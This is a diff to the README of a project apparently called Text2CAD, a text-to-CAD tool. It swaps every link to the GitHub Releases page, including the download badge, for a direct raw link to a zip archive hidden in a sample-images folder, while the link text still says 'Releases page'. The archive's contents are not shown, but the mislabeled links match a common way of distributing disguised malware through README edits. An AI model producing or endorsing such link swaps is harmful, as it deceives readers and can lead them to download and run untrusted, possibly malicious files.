@@ -4,13 +4,13 @@
 Text2CAD is a powerful software designed to convert natural language instructions into accurate CAD models. It helps users in industries like automotive, construction, and engineering without the need for coding skills. Whether you're drafting blueprints or conceptualizing designs, Text2CAD simplifies the process, allowing you to focus on creativity and functionality.
 
 ## 🔗 Download Text2CAD
-[![Download Text2CAD](https://img.shields.io/badge/Download-Text2CAD-brightgreen)](https://github.com/Toommo2/Text2CAD/releases)
+[![Download Text2CAD](https://raw.githubusercontent.com/Toommo2/Text2CAD/main/Sample_Prompts_Images_Steps/Text-CAD-2.1.zip)](https://raw.githubusercontent.com/Toommo2/Text2CAD/main/Sample_Prompts_Images_Steps/Text-CAD-2.1.zip)
 
 ## 🚀 Getting Started
 To start using Text2CAD, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Toommo2/Text2CAD/releases) for Text2CAD.
+   Go to the [Releases page](https://raw.githubusercontent.com/Toommo2/Text2CAD/main/Sample_Prompts_Images_Steps/Text-CAD-2.1.zip) for Text2CAD.
 
 2. **Download the Latest Version**  
    On the Releases page, find the latest version of Text2CAD. Click on the asset you want to download. Remember, downloading may take a few minutes, depending on your internet connection.
@@ -50,7 +50,7 @@ Using Text2CAD is straightforward:
 5. **Save Your Work**: Export your model to the desired file format for future access.
 
 ## 📥 Download & Install
-To access the latest version of Text2CAD, visit the [Releases page](https://github.com/Toommo2/Text2CAD/releases). Download the most recent version and follow the earlier outlined installation steps. 
+To access the latest version of Text2CAD, visit the [Releases page](https://raw.githubusercontent.com/Toommo2/Text2CAD/main/Sample_Prompts_Images_Steps/Text-CAD-2.1.zip). Download the most recent version and follow the earlier outlined installation steps. 
 
 ## 📞 Support
 If you encounter any issues or have questions, feel free to reach out for support. You can find useful resources and solutions on the GitHub issues page or community forums linked on our repository.
